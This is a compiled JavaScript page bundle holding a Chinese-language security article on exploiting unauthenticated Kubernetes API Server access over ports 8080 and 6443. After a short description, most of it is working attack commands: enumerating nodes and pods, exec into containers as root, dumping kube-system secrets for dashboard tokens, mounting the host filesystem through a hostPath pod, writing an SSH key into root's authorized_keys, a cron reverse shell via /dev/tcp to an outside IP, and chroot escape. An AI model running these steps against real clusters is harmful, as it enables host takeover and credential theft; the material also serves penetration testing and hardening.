import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as n,c as i,e as s}from"./app-58e4a7d6.js";const a={},d=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Kubernetes 是一个可以移植、可扩展的开源平台，使用 声明式的配置 并依据配置信息自动地执行容器化应用程序的管理。在所有的容器编排工具中（类似的还有 docker swarm / mesos 等），Kubernetes 的生态系统更大、增长更快，有更多的支持、服务和工具可供用户选择。</p><p>K8s 的 API Server 默认服务端口为 8080(insecure-port) 和 6443(secure-port)，8080 端口提供 HTTP 服务，没有认证授权机制，而 6443 端口提供 HTTPS 服务，支持认证 (使用令牌或客户端证书进行认证) 和授权服务。默认情况下 8080 端口不启动，而 6443 端口启动。这两个端口的开放取决于/etc/kubernetes/manifests/kube-apiserver.yaml 配置文件。</p><p>如果目标 K8s 的 8080 端口开启了，由于其没有认证授权机制，因此存在未授权访问。</p><p>如果目标 K8s 的 6443 端口开启了，如果配置错误，也可以导致存在未授权访问。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="_8080-端口" tabindex="-1"><a class="header-anchor" href="#_8080-端口" aria-hidden="true">#</a> 8080 端口</h3><p>默认情况下，8080 端口关闭的，手动开启：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>cd /etc/kubernetes/manifests
vim kube-apiserver.yaml
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>高版本的 k8s 中，将 --insecure-port 这个配置删除了，因此添加如下两行：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>
- --insecure-port=8080
- --insecure-bind-address=0.0.0.0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230215102911534.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>重启 k8s：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>systemctl restart kubectl
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>访问 8080 端口即可看到存在未授权：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230215110103802.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>也可以使用 kubectl 远程连接获得信息：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>kubectl -s http://your-ip:8080 get nodes
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>注：在高版本（1.20 及其以后）的 K8s 中直接禁用了该端口，并且无法打开。</p><h3 id="_6443-端口" tabindex="-1"><a class="header-anchor" href="#_6443-端口" aria-hidden="true">#</a> 6443 端口</h3><p>如果运维人员配置不当，将 &quot;system:anonymous&quot; 用户绑定到 &quot;cluster-admin&quot; 用户组，则会使得 6443 端口允许匿名用户以管理员权限访问。</p><p>正常情况下访问 6443 端口，提示 Forbidden。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230215110607076.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>执行如下命令将 &quot;system:anonymous&quot; 用户绑定到 &quot;cluster-admin&quot; 用户组：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>kubectl create clusterrolebinding cluster-system-anonymous --clusterrole=cluster-admin --user=system:anonymous
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>再次访问访问 6443 端口，即可未授权访问。</p><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用" aria-hidden="true">#</a> 漏洞利用</h2><h3 id="命令执行" tabindex="-1"><a class="header-anchor" href="#命令执行" aria-hidden="true">#</a> 命令执行</h3><h4 id="查看-k8s-集群信息" tabindex="-1"><a class="header-anchor" href="#查看-k8s-集群信息" aria-hidden="true">#</a> 查看 k8s 集群信息</h4><p>8080 端口</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>kubectl -s http://your-ip:8080 cluster-info
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>6443 端口</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ cluster-info
------
Please enter Username: test
Please enter Password: 
Kubernetes control plane is running at https://172.22.14.37:6443/
KubeDNS is running at https://172.22.14.37:6443//api/v1/namespaces/kube-system/services/kube-dns:dns/proxy
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="查看-node-节点信息" tabindex="-1"><a class="header-anchor" href="#查看-node-节点信息" aria-hidden="true">#</a> 查看 node 节点信息</h4><p>8080 端口</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 查看node节点
kubectl -s http://your-ip:8080 get nodes

# 查看node节点详细信息
kubectl -s http://your-ip:8080 get nodes -o wide
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>6443 端口</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 查看node节点
kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get nodes   
Please enter Username: 
Please enter Password: 
------
NAME         STATUS   ROLES    AGE    VERSION
ubuntu-k8s   Ready    master   244d   v1.16.6-beta.0

# 查看node节点详细信息
kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get nodes -o wide
Please enter Username: 
Please enter Password: 
-----
NAME         STATUS   ROLES    AGE    VERSION          INTERNAL-IP    EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION       CONTAINER-RUNTIME
ubuntu-k8s   Ready    master   244d   v1.16.6-beta.0   172.22.14.37   &lt;none&gt;        Ubuntu 18.04.6 LTS   4.15.0-213-generic   docker://24.0.2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="查看-pod-节点信息" tabindex="-1"><a class="header-anchor" href="#查看-pod-节点信息" aria-hidden="true">#</a> 查看 pod 节点信息</h4><p>8080 端口</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 查看所有的pod
kubectl -s http://your-ip:8080 get pods -A
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>6443 端口</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 查看所有的pod
kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -A
-----
Please enter Username: 
Please enter Password: 
NAMESPACE     NAME                                 READY   STATUS    RESTARTS   AGE
default       nginx-deployment                     1/1     Running   0          16m
default       nginx-deployment-58d48b746d-d6x8t    1/1     Running   3          240d
...
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="执行其他命令" tabindex="-1"><a class="header-anchor" href="#执行其他命令" aria-hidden="true">#</a> 执行其他命令</h4><p>通过获取到的 pods 节点信息，进入对应 docker 命令执行。-n 对应的是 NAMESPACE，-it 对应的是 NAME。</p><h5 id="_8080-端口-1" tabindex="-1"><a class="header-anchor" href="#_8080-端口-1" aria-hidden="true">#</a> 8080 端口</h5><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># 进入命名空间为default，名字为hello-minikube的容器
kubectl -s http://your-ip:8080 exec -n default -it hello-minikube -- /bin/bash

# 进入命名空间为kube-system，名字为etcd-ubuntu的容器
kubectl -s http://your-ip:8080 exec -n kube-system -it etcd-ubuntu -- /bin/sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="_6443-端口-1" tabindex="-1"><a class="header-anchor" href="#_6443-端口-1" aria-hidden="true">#</a> 6443 端口</h5><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>kubectl --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment -- /bin/bash
-----
Please enter Username: 
Please enter Password: 
root@nginx-deployment:/# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="获取-token-登录-dashboard" tabindex="-1"><a class="header-anchor" href="#获取-token-登录-dashboard" aria-hidden="true">#</a> 获取 Token 登录 dashboard</h3><p>访问如下接口，即可看到 K8s 所有的 Token，过滤找到 dashboard-admin 相关的 Token。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:8080/api/v1/namespaces/kube-system/secrets/

https://your-ip:6443/api/v1/namespaces/kube-system/secrets/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>base64 解码，即可使用 base64 解码后的 Token 登录 K8s 的 dashboard。</p><h3 id="获取宿主机权限" tabindex="-1"><a class="header-anchor" href="#获取宿主机权限" aria-hidden="true">#</a> 获取宿主机权限</h3><h4 id="创建-pod" tabindex="-1"><a class="header-anchor" href="#创建-pod" aria-hidden="true">#</a> 创建 pod</h4><p>创建名为 nginx-deployment 的 pod，将宿主机的目录挂载到 /mnt 目录下。</p><p>新建 test.yaml 文件，内容如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>apiVersion: v1
kind: Pod
metadata:
  name: nginx-deployment
spec:
  containers:
  - image: nginx:1.8
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test
  volumes:
  - name: test
    hostPath:
      path: /
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>创建 pod 并查看运行情况：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>kubectl --insecure-skip-tls-verify -s https://your-ip:6443/ apply -f test.yaml
-----
Please enter Username: test
Please enter Password: pod/nginx-deployment created
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>kubectl --insecure-skip-tls-verify -s https://your-ip:6443/ get pods
-----
Please enter Username: test
Please enter Password: NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment                    1/1     Running   0          12s
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="写入-ssh-公钥" tabindex="-1"><a class="header-anchor" href="#写入-ssh-公钥" aria-hidden="true">#</a> 写入 ssh 公钥</h4><p>向 <code>/mnt/root/.ssh/authorized_keys</code> 写入公钥，即可获取宿主机 ssh 权限：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>kubectl --insecure-skip-tls-verify -s https://your-ip:6443/ exec -it nginx-deployment /bin/bash
-----
root@nginx-deployment:/# echo &quot;&lt;YOUR_ID_RSA.PUB&gt;&quot; &gt; /mnt/root/.ssh/authorized_keys
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="定时任务反弹-shell" tabindex="-1"><a class="header-anchor" href="#定时任务反弹-shell" aria-hidden="true">#</a> 定时任务反弹 shell</h4><p>写入 crontab 来反弹获取 shell，执行如下命令，将反弹 shell 的命令写入 /var/spool/cron/root 文件中：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &quot;*/1  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/172.16.200.58/4444 0&gt;&amp;1&quot; &gt; root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>nc 监听接收反弹 shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>$ nc -lvp 4444
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h4 id="chroot-逃逸" tabindex="-1"><a class="header-anchor" href="#chroot-逃逸" aria-hidden="true">#</a> chroot 逃逸</h4><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>chroot /mnt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,71),t=[d];function r(l,u){return n(),i("div",null,t)}const o=e(a,[["render",r],["__file","K8s API Server未授权命令执行.html.vue"]]);export{o as default};
